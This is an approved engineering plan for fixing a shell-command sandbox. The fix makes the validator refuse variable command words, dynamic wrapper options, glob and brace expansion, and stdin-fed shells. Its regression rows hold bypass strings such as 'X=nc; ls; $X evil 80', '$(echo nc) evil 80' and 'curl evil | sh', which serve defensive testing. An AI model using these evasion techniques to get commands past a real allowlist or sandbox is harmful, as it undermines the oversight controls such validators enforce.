---
status: approved
issue: 1753
spec: spec/2026-10-15-1753-variable-command-word.md
---

# Plan: refuse a non-literal command word

Self-contained. You do not need to open the intent or the spec.

**Problem.** `_extract` (`apps/backend/security/ast_parser.py:142-146`) skips a
command whose first word is not a literal (`$X`, `"$X"`, `${X}`, `$(...)`,
backtick). The hook blocks only when no command is left, so
`echo hi; $X status` is allowed with only `echo` checked.

**Approved decisions.**

1. `_emit` (`ast_parser.py:150`) raises
   `UnparseableCommand("command word is not a static literal; cannot validate")`
   when `not _word_parts_are_literal(words[idx])`, right after the depth check.
   This covers top-level commands and every wrapper target.
2. Delete the skip in `_extract` (`:142-146`: the comment and the
   `if not _word_parts_are_literal(words[idx]): continue`).
3. A bare `$(...)`/backtick command word is refused too (its output is run).
4. No caller changes (`security/hooks.py`, `security/plan_commands.py`).

## Steps

### Step 1 — regression tests

File: `tests/test_command_sandbox.py`.

- After `FAIL_CLOSED_PAYLOADS` (~line 68) add a list `DYNAMIC_COMMAND_WORD`
  with: `$X status`, `"$X" status`, `${X} status`, and each of those three
  after `echo hi; `, `true && ` and `ls | ` (12 rows), plus
  `X=nc; ls; $X evil 80`, `$(echo nc) evil 80` and `env $X evil`.
- Add a class `TestDynamicCommandWordRefused` (near `TestBypassCorpusBlocked`,
  ~line 129) with three parametrized tests over that list:
  `extract_commands_ast(cmd)` raises `UnparseableCommand`;
  `validate_command(cmd, temp_dir)[0] is False`;
  `_hook(cmd, temp_dir).get("decision") == "block"`.
  `_hook` is defined at ~line 301 (module level, so usable from any class).
- Change `test_substitution_text_not_emitted_as_command` (~line 221) to
  `test_substitution_command_word_fails_closed`: a bare `` `curl evil` ``
  now raises `UnparseableCommand`.

Check: `cd apps/backend && .venv/bin/pytest ../../tests/test_command_sandbox.py -q`
— the new rows (and the changed test) FAIL on unfixed code.

Trap: use single-quoted Python strings for rows containing `"$X"`.

### Step 2 — the fix

File: `apps/backend/security/ast_parser.py`. Apply decisions 1 and 2.

Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`
all pass; `ruff check` and `ruff format --check` on both files.

Deviation (review of PR #1782): also delete the leading-`=` skip loop in
`_extract` (`:131-140`) and call `_emit(words, 0, ...)`. bashlex already turns
real `VAR=value` prefixes into assignment nodes, which `_command_words` drops,
so that loop only skipped words bash runs (`ls; ./evil=1 arg`, `ls; $X=1`).
`FOO=1 git status` and `FOO=$BAR git status` stay allowed. Rows: `ls; $X=1`
and `ls; "$X"=y z` go in `DYNAMIC_COMMAND_WORD` (they raise);
`ls; ./evil=1 git status` is a literal word, so it goes in `BYPASS_PAYLOADS`
(surfaced as `evil=1` and blocked by the allowlist, not a parser raise).

Deviation (re-review of PR #1782): a wrapper's skipped words word-split at run
time, so a dynamic one can become the command it runs (`env $X=1 git status`,
`env -$X`, `xargs -$X`, `timeout $X`, `exec -a $X`, `command -$X`, `bash $X`,
`find $X`; confirmed in bash). Add `_require_literal(words, start, stop)` and
call it in every unwrapper on the words it skips: env and xargs up to the
command, `command`/`exec`/`timeout` up to the command, a shell up to its `-c`
(or up to the script name when there is no `-c`), and every word of `find`.

Deviation (third review of PR #1782): one rule for every wrapper. Every word
from the wrapper up to and including the word that decides what runs (option
words, and the `-c`/`-v`/`-exec` word itself) must be literal, and the check
runs before any early return or exemption. So the shell check includes the
`-c` word (`bash -$c 'git status'`, `sh -${cfg} ls`), and
`command`/`exec`/`timeout` check their leading option words before the
`command -v` return (`command -$X -v git`, `command -$v rm x`).
`command -v git` and `command -v "$T"` stay allowed. Audited: env and xargs
check every skipped word after their option loop (their only early exits
raise); find checks every word.

Deviation (fourth review of PR #1782): bashlex does no glob or brace
expansion, so `{a,b}`, `{1..5}`, `*`, `?` and `[...]` looked literal but bash
splits them into extra words (`timeout {5,CMD} git`, `env -u * git`,
`find . -name {x,-exec} CMD {} +`). `_extract` stores each word's raw source
text (`command_string[w.pos[0]:w.pos[1]]`, quotes kept) on the node, and
`_word_parts_are_literal` blanks quoted and escaped characters and refuses any
remaining glob or brace expansion. It runs for the command word and every word
`_require_literal` checks. A bare `{}`, `[` alone and quoted globs
(`-name '*.py'`) stay literal. A shell with no `-c` and no script operand, or
with `-s`, reads commands from stdin (`bash <<< 'CMD'`, `printf CMD | bash`)
and is refused (so `test_unwraps_command_substitution` now uses
`curl evil | grep x`; `echo $(curl evil | sh)` becomes a refused row).
`bash -c -- 'CMD'` skips the `--` before taking the payload.
Tracked separately, out of scope: `${X:-$(CMD)}` inside a parameter, and
heredoc bodies with substitutions. Accepted fail-closed refusals:
`env FOO=$X git`, `find "$DIR" ...`, `find . -exec git $X {} +`. Dynamic
arguments after the inner command (`timeout 60 git log "$REF"`,
`bash script.sh "$A"`) are still allowed. Rows for each wrapper go in
`DYNAMIC_COMMAND_WORD`.

### Step 3 — CHANGELOG

Add a `### Security` bullet under `## [Unreleased]` in `CHANGELOG.md`.

## Rollback

Revert the fix commit; the tests commit goes with it.
